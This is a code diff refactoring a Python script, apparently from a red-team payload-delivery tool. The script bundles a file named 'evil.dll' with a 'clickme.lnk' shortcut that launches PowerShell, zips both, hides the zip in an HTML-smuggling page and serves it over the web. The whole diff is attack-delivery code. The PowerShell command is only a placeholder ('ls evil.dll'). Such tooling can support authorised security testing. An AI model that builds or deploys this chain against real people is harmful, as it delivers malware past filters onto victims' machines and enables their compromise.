@@ -11,38 +11,37 @@ from web import serve
 
 def main():
     # DLL
-    payloadData = readFileContent('payloads/evil.dll')
-    payloadFile = makeAceFile('evil.dll', payloadData)
+    dllData: bytes = readFileContent('payloads/evil.dll')
+    dllFile: AceFile = makeAceFile('evil.dll', dllData)
     
     # LNK to powershell.exe to execute DLL
-    payloadExecData = 'ls evil.dll'
-    payloadExecData = makePowershell(
-        input=payloadExecData,
+    execData: str = makePowershell(
+        input='ls evil.dll',
         options={},
     )
-    payloadExec = makeLnk(
+    lnkData: bytes = makeLnk(
         name = "clickme.lnk",
         target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        arguments = "-noexit -command {}".format(payloadExecData),
+        arguments = "-noexit -command {}".format(execData),
     )
-    payloadExeFile = makeAceFile('clickme.lnk', payloadExec)
+    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)
 
     # Pack DLL and LNK into ISO
-    container = makeZip(
+    container: bytes = makeZip(
         files = [
-            payloadFile,
-            payloadExeFile,
+            dllFile,
+            lnkFile,
         ],
     )
-    containerFile = makeAceFile('test2.zip', container)
+    containerFile: AceFile = makeAceFile('test2.zip', container)
 
     # HTML to serve ISO
-    html = makeHtmlSmuggling(
+    html: str = makeHtmlSmuggling(
         containerFile,
     )
 
     # serve HTML
-    serveHtml = AceRoute('/test2', html)
+    serveHtml: AceRoute = AceRoute('/test2', html)
     serve([serveHtml])
 
 
